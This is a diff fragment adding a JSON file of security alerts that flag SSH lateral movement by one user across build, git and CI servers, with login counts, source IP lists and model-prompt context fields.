+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 295,
+          "source_ips": 20
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    },
+    {
+      "type": "ssh_lateral_movement",
+      "subject": "tnghia",
+      "severity": "CRITICAL",
+      "score": 9.5,
+      "text": "SSH lateral movement detected: User 'tnghia' logged in 310 times from 21 different source IPs to 3 servers.",
+      "evidence": {
+        "username": "tnghia",
+        "login_count": 310,
+        "unique_source_ips": 21,
+        "source_ips": [
+          "10.168.102.183",
+          "10.243.246.222",
+          "10.116.28.19",
+          "10.97.208.176",
+          "203.0.113.100",
+          "10.175.45.166",
+          "10.149.15.24",
+          "10.132.199.126",
+          "172.16.0.1",
+          "10.60.88.220"
+        ],
+        "target_hosts": [
+          "buildsrv01",
+          "gitsrv01",
+          "ci-runner01"
+        ]
+      },
+      "prompt_ctx": {
+        "user": "tnghia",
+        "group": null,
+        "behavior": {
+          "type": "ssh_lateral_movement",
+          "logins": 310,
+          "source_ips": 21
+        },
+        "time": null,
+        "baseline": {
+          "expected_source_ips": 1
+        },
+        "extras": {
+          "reason": "Multiple source IPs indicate lateral movement or compromised credentials"
+        }
+      }
+    }
+  ]
+}
